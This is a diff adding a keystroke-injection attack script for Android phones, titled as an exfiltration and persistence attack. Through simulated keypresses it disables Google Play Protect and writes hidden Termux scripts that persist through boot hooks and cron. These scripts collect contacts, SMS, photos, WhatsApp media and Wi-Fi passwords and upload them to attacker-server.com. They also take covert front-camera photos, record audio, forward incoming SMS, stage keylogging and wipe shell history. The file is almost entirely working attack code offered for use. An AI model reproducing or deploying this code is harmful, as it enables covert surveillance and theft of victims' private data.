@@ -1,0 +1,231 @@
+// Advanced Android Exfiltration and Persistence Attack
+
+// Phase 1: Initial Access - Disable security features
+// ==================================================
+// Open settings
+RunNix am start -n com.android.settings/.Settings
+Delay 2000
+
+// Navigate to security settings (may vary by device)
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Delay 500
+Press KEY_ENTER
+Delay 1500
+
+// Disable Google Play Protect
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_ENTER
+Delay 1000
+Press KEY_TAB
+Press KEY_ENTER
+Delay 1000
+Press KEY_TAB
+Press KEY_TAB
+Press KEY_ENTER
+Delay 1000
+
+// Return to home
+Press KEY_HOME
+Delay 1000
+
+// Phase 2: Create hidden payload file
+// ==================================
+// Open terminal app
+RunNix am start -a android.intent.action.MAIN -n com.termux/.app.TermuxActivity
+Delay 3000
+
+// Create persistence and data collection script
+PrintLine mkdir -p /sdcard/.system_data
+Delay 500
+PrintLine cat > /sdcard/.system_data/sync.sh << 'EOL'
+Delay 500
+PrintLine #!/bin/sh
+PrintLine # Create persistence mechanism
+PrintLine mkdir -p $HOME/.termux/boot
+PrintLine echo "#!/bin/sh" > $HOME/.termux/boot/start-services.sh
+PrintLine echo "nohup sh /sdcard/.system_data/sync.sh > /dev/null 2>&1 &" >> $HOME/.termux/boot/start-services.sh
+PrintLine chmod 700 $HOME/.termux/boot/start-services.sh
+PrintLine
+PrintLine # Schedule periodic execution using crontab
+PrintLine (crontab -l 2>/dev/null; echo "*/15 * * * * /bin/sh /sdcard/.system_data/sync.sh") | crontab -
+PrintLine
+PrintLine # Collect sensitive data
+PrintLine collect_data() {
+PrintLine   DATADIR="/sdcard/.system_data/collected"
+PrintLine   mkdir -p $DATADIR
+PrintLine   DATE=$(date +%Y%m%d_%H%M%S)
+PrintLine
+PrintLine   # Collect contacts
+PrintLine   content query --uri content://contacts/phones > $DATADIR/contacts_$DATE.txt
+PrintLine
+PrintLine   # Collect SMS
+PrintLine   content query --uri content://sms > $DATADIR/sms_$DATE.txt
+PrintLine
+PrintLine   # Collect photos
+PrintLine   find /sdcard/DCIM -type f -name "*.jpg" -mtime -7 -exec cp {} $DATADIR/ \; 2>/dev/null
+PrintLine
+PrintLine   # Collect screenshots
+PrintLine   find /sdcard/Pictures/Screenshots -type f -mtime -3 -exec cp {} $DATADIR/ \; 2>/dev/null
+PrintLine
+PrintLine   # Collect WhatsApp media
+PrintLine   find /sdcard/WhatsApp/Media -type f -mtime -2 -exec cp {} $DATADIR/ \; 2>/dev/null
+PrintLine
+PrintLine   # Collect installed apps
+PrintLine   pm list packages > $DATADIR/apps_$DATE.txt
+PrintLine
+PrintLine   # Collect Wi-Fi passwords (requires root)
+PrintLine   if [ -f /data/misc/wifi/wpa_supplicant.conf ]; then
+PrintLine     cp /data/misc/wifi/wpa_supplicant.conf $DATADIR/wifi_$DATE.conf
+PrintLine   fi
+PrintLine
+PrintLine   # Package data
+PrintLine   tar -czf $DATADIR/data_$DATE.tar.gz $DATADIR/*_$DATE.*
+PrintLine
+PrintLine   # Exfiltrate data
+PrintLine   if [ -x "$(command -v curl)" ]; then
+PrintLine     curl -F "file=@$DATADIR/data_$DATE.tar.gz" https://attacker-server.com/upload.php
+PrintLine   elif [ -x "$(command -v wget)" ]; then
+PrintLine     wget --post-file=$DATADIR/data_$DATE.tar.gz https://attacker-server.com/upload.php
+PrintLine   fi
+PrintLine }
+PrintLine
+PrintLine # Take photos silently
+PrintLine take_photos() {
+PrintLine   IMGDIR="/sdcard/.system_data/surveillance"
+PrintLine   mkdir -p $IMGDIR
+PrintLine   DATE=$(date +%Y%m%d_%H%M%S)
+PrintLine
+PrintLine   # Attempt to capture photo from front camera
+PrintLine   am start -a android.media.action.IMAGE_CAPTURE --ez android.intent.extra.USE_FRONT_CAMERA true
+PrintLine   sleep 3
+PrintLine   input keyevent 27  # Take picture
+PrintLine   sleep 2
+PrintLine   input keyevent 4   # Back key
+PrintLine   # Move the latest photo
+PrintLine   LATEST=$(find /sdcard/DCIM -type f -name "*.jpg" -o -name "*.jpeg" | sort -r | head -1)
+PrintLine   if [ -n "$LATEST" ]; then
+PrintLine     cp "$LATEST" "$IMGDIR/front_$DATE.jpg"
+PrintLine   fi
+PrintLine }
+PrintLine
+PrintLine # Record audio
+PrintLine record_audio() {
+PrintLine   AUDIODIR="/sdcard/.system_data/audio"
+PrintLine   mkdir -p $AUDIODIR
+PrintLine   DATE=$(date +%Y%m%d_%H%M%S)
+PrintLine   
+PrintLine   # Start recording app
+PrintLine   am start -a android.intent.action.MAIN -n com.android.soundrecorder/.SoundRecorder
+PrintLine   sleep 2
+PrintLine   input keyevent 27  # Start recording
+PrintLine   sleep 30           # Record for 30 seconds
+PrintLine   input keyevent 27  # Stop recording
+PrintLine   sleep 2
+PrintLine   input keyevent 4   # Back key
+PrintLine   
+PrintLine   # Find and move the recording
+PrintLine   LATEST=$(find /sdcard/Recordings -type f | sort -r | head -1)
+PrintLine   if [ -n "$LATEST" ]; then
+PrintLine     cp "$LATEST" "$AUDIODIR/recording_$DATE.mp3"
+PrintLine   fi
+PrintLine }
+PrintLine
+PrintLine # Main execution
+PrintLine collect_data
+PrintLine
+PrintLine # Run surveillance actions with random intervals to avoid detection patterns
+PrintLine RAND=$((RANDOM % 5))
+PrintLine if [ $RAND -eq 1 ]; then
+PrintLine   take_photos
+PrintLine elif [ $RAND -eq 2 ]; then
+PrintLine   record_audio
+PrintLine fi
+PrintLine
+PrintLine exit 0
+PrintLine EOL
+Delay 500
+PrintLine chmod +x /sdcard/.system_data/sync.sh
+Delay 500
+
+// Execute initial data collection
+PrintLine nohup sh /sdcard/.system_data/sync.sh > /dev/null 2>&1 &
+Delay 500
+
+// Phase 3: Setup SMS monitoring and forwarding
+// ==========================================
+PrintLine cat > /sdcard/.system_data/sms_forward.sh << 'EOL'
+Delay 500
+PrintLine #!/bin/sh
+PrintLine # Setup SMS forwarding
+PrintLine LAST_ID=$(content query --uri content://sms/inbox --sort "date DESC" --limit 1 | grep _id | cut -d= -f2)
+PrintLine while true; do
+PrintLine   sleep 60
+PrintLine   CURRENT_ID=$(content query --uri content://sms/inbox --sort "date DESC" --limit 1 | grep _id | cut -d= -f2)
+PrintLine   if [ "$CURRENT_ID" != "$LAST_ID" ]; then
+PrintLine     NEW_SMS=$(content query --uri content://sms/inbox --sort "date DESC" --limit 1)
+PrintLine     SENDER=$(echo "$NEW_SMS" | grep address | cut -d= -f2)
+PrintLine     BODY=$(echo "$NEW_SMS" | grep body | cut -d= -f2)
+PrintLine     # Forward new SMS via data connection
+PrintLine     if [ -x "$(command -v curl)" ]; then
+PrintLine       curl -d "sender=$SENDER&message=$BODY" https://attacker-server.com/sms.php
+PrintLine     fi
+PrintLine     LAST_ID=$CURRENT_ID
+PrintLine   fi
+PrintLine done
+PrintLine EOL
+Delay 500
+PrintLine chmod +x /sdcard/.system_data/sms_forward.sh
+Delay 500
+PrintLine nohup sh /sdcard/.system_data/sms_forward.sh > /dev/null 2>&1 &
+Delay 500
+
+// Phase 4: Deploy keylogger functionality for credentials
+// ====================================================
+PrintLine cat > /sdcard/.system_data/keylog_setup.sh << 'EOL'
+Delay 500
+PrintLine #!/bin/sh
+PrintLine # Setup accessibility service to monitor keyboard input
+PrintLine # This requires granting accessibility permissions
+PrintLine
+PrintLine # Open accessibility settings
+PrintLine am start -a android.settings.ACCESSIBILITY_SETTINGS
+PrintLine
+PrintLine # Note: User would need to manually enable the service, but we can leave
+PrintLine # a shell script that will install and setup a malicious app when executed
+PrintLine EOL
+Delay 500
+PrintLine chmod +x /sdcard/.system_data/keylog_setup.sh
+Delay 500
+
+// Phase 5: Clean up traces
+// =====================
+PrintLine history -c
+Delay 500
+PrintLine rm ~/.bash_history
+Delay 500
+
+// Exit terminal
+Press KEY_LEFT_CTRL
+Print d
+Release
+Delay 500
+
+// Phase 6: Hide evidence by resetting launcher
+// ==========================================
+Press KEY_HOME
+Delay 1000
+
+// Open an innocent app to mask activity
+RunNix am start -a android.intent.action.MAIN -n com.android.settings/.Settings
+Delay 1000
+Press KEY_BACK
+Delay 500
+Press KEY_HOME
